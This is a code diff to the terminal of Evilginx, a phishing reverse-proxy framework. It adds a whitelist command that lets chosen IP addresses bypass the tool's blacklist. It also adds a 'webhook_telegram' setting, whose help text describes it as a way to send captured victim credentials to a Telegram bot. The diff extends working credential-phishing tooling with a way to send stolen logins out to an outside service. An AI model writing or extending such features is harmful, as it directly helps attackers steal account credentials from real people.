@@ -153,6 +153,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("blacklist: %v", err)
 			}
+		case "whitelist":
+			cmd_ok = true
+			err := t.handleWhitelist(args[1:])
+			if err != nil {
+				log.Error("whitelist: %v", err)
+			}
 		case "test-certs":
 			cmd_ok = true
 			t.manageCertificates(true)
@@ -187,8 +193,8 @@ func (t *Terminal) handleConfig(args []string) error {
 			autocertOnOff = "on"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "webhook_telegram", "autocert"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, t.cfg.GetWebhookTelegram(), autocertOnOff}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -209,6 +215,10 @@ func (t *Terminal) handleConfig(args []string) error {
 				}
 			}
 			t.cfg.SetUnauthUrl(args[1])
+			return nil
+		case "webhook_telegram":
+			t.cfg.SetWebhookTelegram(args[1])
+			log.Warning("Restart Evilginx to activate Telegram notifications")
 			return nil
 		case "autocert":
 			switch args[1] {
@@ -233,6 +243,50 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.cfg.SetServerBindIP(args[2])
 				return nil
 			}
+		}
+	}
+	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleWhitelist(args []string) error {
+	pn := len(args)
+	if pn == 0 {
+		ip_num, mask_num := t.p.bl.GetWhitelistStats()
+		log.Info("whitelist: loaded %d ip addresses and %d ip masks", ip_num, mask_num)
+
+		ips := t.p.bl.ListWhitelist()
+		if len(ips) > 0 {
+			log.Info("whitelisted IPs:")
+			for _, ip := range ips {
+				log.Info("  %s", ip)
+			}
+		}
+		return nil
+	} else if pn == 2 {
+		switch args[0] {
+		case "add":
+			err := t.p.bl.AddWhitelistIP(args[1])
+			if err != nil {
+				return err
+			}
+			return nil
+		case "remove":
+			err := t.p.bl.RemoveWhitelistIP(args[1])
+			if err != nil {
+				return err
+			}
+			log.Success("whitelist: removed ip address: %s", args[1])
+			return nil
+		}
+	} else if pn == 1 {
+		switch args[0] {
+		case "clear":
+			err := t.p.bl.ClearWhitelist()
+			if err != nil {
+				return err
+			}
+			log.Success("whitelist: cleared all entries")
+			return nil
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -1132,6 +1186,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
+	h.AddSubCommand("config", []string{"webhook_telegram"}, "webhook_telegram <bot_token>/<chat_id>", "set Telegram webhook for credential notifications (format: bot_token/chat_id)")
 	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
@@ -1205,6 +1260,14 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("blacklist", []string{"noadd"}, "noadd", "block but do not add new ip addresses to blacklist")
 	h.AddSubCommand("blacklist", []string{"off"}, "off", "ignore blacklist and allow every request to go through")
 	h.AddSubCommand("blacklist", []string{"log"}, "log <on|off>", "enable or disable log output for blacklist messages")
+
+	h.AddCommand("whitelist", "general", "manage whitelisted ip addresses that bypass blacklist", "Add, remove, or list IP addresses that should bypass all blacklist checks.", LAYER_TOP,
+		readline.PcItem("whitelist", readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("clear")))
+
+	h.AddSubCommand("whitelist", nil, "", "show all whitelisted IP addresses")
+	h.AddSubCommand("whitelist", []string{"add"}, "add <ip>", "add IP address or CIDR range to whitelist (e.g., 192.168.1.100 or 192.168.1.0/24)")
+	h.AddSubCommand("whitelist", []string{"remove"}, "remove <ip>", "remove IP address from whitelist")
+	h.AddSubCommand("whitelist", []string{"clear"}, "clear", "remove all IP addresses from whitelist")
 
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
